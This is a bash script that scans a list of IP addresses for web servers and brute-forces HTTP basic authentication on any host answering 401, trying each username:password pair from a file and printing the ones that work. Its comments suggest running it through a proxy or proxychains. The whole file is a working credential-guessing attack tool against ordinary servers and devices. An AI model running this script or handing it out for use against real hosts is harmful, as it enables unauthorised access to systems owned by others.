#!/bin/bash

#=================#
#    VARIABLES    #
#=================#

ips=`cat ip.list`
users=`cat users.list`
PING_CHECK=0
DISPLAY_DEAD=1

# FOR ALL IP ADDRESSES IN THE FILE

for ip in $ips; do
	# IF  YOU WANT TO LIMIT THE CHECK TO ONLY
	# REACHABLE BY ICMP SET PING_CHECK VARIABLE
	if [[ $PING_CHECK -eq 1 ]];then
		connection=`ping -W 1 -c 1 $ip | grep "1 packets" | grep -v "errors" | cut -d " " -f 6 | cut -b 1`
	else
		connection=0
	fi

	if [[ $connection -eq 0 ]]; then
		if [[ $PING_CHECK -eq 1 ]]; then
			# ALIVE MEANS REACHABLE BY PING
			echo -ne "\n $ip\t\033[1;32mALIVE\033[0m ";
		else
			echo -ne "\n $ip\t";
		fi

		flag=0
		while [[ $flag -eq 0 ]]; do

			# SET THE CURL TO USE PROXY WITH -x PARAMETER
			# OR RUN SCRIPT VIA PROXYCHAIN

			header=`curl --connect-timeout 3 -I -s $ip --location | head -1`
			web=`echo $header | grep " 200" | wc -w`
			auth=`echo $header | grep "HTTP/1.1 401" | wc -w`

			if [[ $web -gt 1 ]]; then
				# HTTP/1.* 200 OK - WEB SERVER FOUND
				echo -ne "\t \033[37m-> 200\033[0m "
			fi

			if [[ $auth -gt 1 ]]; then

			# HTTP/1.* 401 AUTHORIZATION REQUIRED

			echo -ne "\t \033[37m-> 401\033[0m "

			# TRY AUTHENTICATE WITH COMMON USERNAMES
			# AND PASSWORDS FROM $users FILE

				for user in $users; do
					passcheck=`curl --connect-timeout 3 -I -s -u $user $ip --location | head -1 | grep "HTTP/1.1 401" | wc -w`
					if [[ $passcheck -lt 1 && $flag -eq 0 ]]; then
						# DISPLAY PASSWORD IF FOUND
						echo -ne "\t\033[32mPASS: $user\033[0m";
						flag=1
						break;
					else
						echo -ne "\033[37m|\033[0m";
					fi
				done
			fi
			flag=1
		done
	else
	# IF YOU WANT TO SEE ALL IP ADDRESSES THAT ARE BEING CHECKED
	# SET $DISPLAY_DEAD
		if [[ $DISPLAY_DEAD -eq 1 ]]; then
			echo -ne "\n $ip\t\033[31mDEAD\033[0m ";
		fi
	fi
done